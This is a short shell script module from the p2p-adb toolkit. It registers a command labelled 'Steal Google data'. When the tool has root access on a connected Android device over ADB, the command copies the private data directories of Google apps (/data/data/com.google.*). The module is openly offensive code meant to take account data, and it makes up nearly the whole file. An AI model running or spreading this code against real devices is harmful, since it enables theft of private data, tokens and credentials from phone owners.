# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# Registering command
registerCommand "2:getGoogleData:Steal Google data"


getGoogleData(){
	if [ $ISROOT -le 2 ]; then
		DATAPATH='/data/data/com.google.*'
		echo 'We are root...'
		getData "$DATAPATH"
	else
		echo "$ISROOT"
	fi
}
